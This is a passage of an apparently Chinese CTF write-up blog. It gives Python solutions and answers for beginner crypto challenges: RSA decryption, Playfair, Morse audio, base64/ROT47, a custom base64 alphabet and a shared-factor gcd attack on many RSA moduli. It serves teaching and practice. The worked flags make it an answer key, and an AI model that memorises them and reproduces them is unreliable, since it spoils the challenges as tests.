gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)  <span class="comment"># 10进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])  <span class="comment"># 16进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))  <span class="comment"># 16进制转文本</span></span><br></pre></td></tr></table></figure><h2 id="Cipher-1"><a href="#Cipher-1" class="headerlink" title="Cipher 1"></a>Cipher 1</h2><p>Playfair解密</p><img src="https://blue-blue-blue-blue.github.io/img/b30.png" width ="60%"><h2 id="robomunication-1"><a href="#robomunication-1" class="headerlink" title="robomunication 1"></a>robomunication 1</h2><p>打开发现题目是一个mp3文件，里面有“哔”和“不”两种声音，用audacity打开，观察声波的形状和间隔，将“哔”记为“.”,“不”记为“-”，间隔记为空格，得到的字符串进行摩斯解码得HELLOWHATISTHEKEYITISBOOPBEEP，则答案为BOOPBEEP</p><h2 id="CheckIn-1"><a href="#CheckIn-1" class="headerlink" title="CheckIn 1"></a>CheckIn 1</h2><p>题目dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg&#x3D;&#x3D;用base64进行解密得v)<em>L</em>_F0}@H0F49023@FE0#@EN，在将解密后的数据进行ROT47解密即可</p><h2 id="BabyRSA1"><a href="#BabyRSA1" class="headerlink" title="BabyRSA1"></a>BabyRSA1</h2><p>n &#x3D; (p+1)*(q+1) - (p+q) - 1，常规rsa解密即可</p><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p>三个数一组，转八进制后再转ASCII码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">111</span>,<span class="number">114</span>,<span class="number">157</span>,<span class="number">166</span>,<span class="number">145</span>,<span class="number">123</span>,<span class="number">145</span>,<span class="number">143</span>,<span class="number">165</span>,<span class="number">162</span>,<span class="number">151</span>,<span class="number">164</span>,<span class="number">171</span>,<span class="number">126</span>,<span class="number">145</span>,<span class="number">162</span>,<span class="number">171</span>,<span class="number">115</span>,<span class="number">165</span>,<span class="number">143</span>,<span class="number">150</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    i = <span class="built_in">str</span>(i)</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="rsa2-1"><a href="#rsa2-1" class="headerlink" title="rsa2   1"></a>rsa2   1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line">p=<span class="number">9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line">q=<span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="string">b&#x27;0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975L&#x27;</span>).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#python3的结果hex(d)=0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975,较python2末尾少一个L，故倒数第二步要手动加上</span></span><br></pre></td></tr></table></figure><h2 id="这是base？？"><a href="#这是base？？" class="headerlink" title="这是base？？"></a>这是base？？</h2><p>chipertext的字母在dict对应的数字 在base64中对应的字符即为所求串，将串base64解码得flag。即运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>,<span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">cipher=<span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">dict</span>[j]==cipher[i]):</span><br><span class="line">            res+=base64_list[j]</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><p>已知e,和多组n、c。通过对不同的n进行gcd()算法，求出最大公约数，即p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n0 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c0 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c1 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c2 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c3 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c4 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c5 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c6 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c7 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c8 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c9 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c10 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c11 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c12 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c13 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c14 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n15 = <span 